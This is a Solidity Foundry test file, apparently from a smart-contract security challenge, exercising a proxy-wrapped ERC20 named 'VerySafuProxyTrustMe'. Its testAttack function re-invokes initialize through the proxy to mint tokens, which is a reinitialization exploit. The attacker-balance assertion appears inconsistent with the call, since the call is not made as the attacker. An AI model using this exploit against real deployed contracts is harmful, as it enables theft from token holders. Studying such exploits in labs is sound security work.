// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import {VerySafuProxyTrustMe} from "../src/VerySafuProxyTrustMe.sol";
import {ERC20} from "../src/ERC20.sol";

contract VerySafuTest is Test {
    VerySafuProxyTrustMe public verySafu;
    NewImplementation newImplementation;
    ERC20 erc20;
    address owner = address(0x768);
    address admin = address(0x456);
    address attacker = address(0x235);

    function setUp() public {
        //admin is the one to deploy contracts
        vm.startPrank(admin);
        erc20 = new ERC20();
        verySafu = new VerySafuProxyTrustMe(address(erc20), owner);
        vm.stopPrank();

        vm.startPrank(owner);
        ERC20(address(verySafu)).initialize("ExploitToken","EXP",18, 1000e18);
        vm.stopPrank();

        newImplementation = new NewImplementation();
    }

    // function test_Slot() public {
    //     uint256 balanceSlot = keccack256(abi.encodePacked(uint256(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85), uint256(3));
    //     console.log("balanceSlot:",balanceSlot);
    // }


    function testExploitToken() public{
        vm.prank(owner);
        ERC20(address(verySafu)).transfer(0x47Adc0faA4f6Eb42b499187317949eD99E77EE85,1e18);
        vm.startPrank(admin);
        verySafu.upgrade(address(newImplementation));
        vm.stopPrank();
    }
    function testAttack() public {
        // Attacker reinitializes the ERC20 contract through the proxy
        (bool success,) = address(verySafu).call(abi.encodeWithSignature(
            "initialize(string,string,uint8,uint256)",
            "ExploitToken", "EXP", 18, 1e18
        ));
        require(success, "Initialization failed");

        //balance of the attacker
        uint256 balance = ERC20(address(verySafu)).balanceOf(attacker);
        assertEq(balance, 1e18, "Exploit failed: wrong balance");
    }

    // function test_verifyOptInSlot() external pure returns (bool) {
    
    //     bytes32 computedHash = keccak256("eip1967.proxy.optIn");


    //     bytes32 computedSlot = bytes32(uint256(computedHash) - 1);

    //     return computedSlot == verySafu._OPTIN_SLOT();
    // }

}

contract NewImplementation{

    uint256 value;

    function addValue(uint256 a,uint256 b) public{
        value = a+b;
    }
}
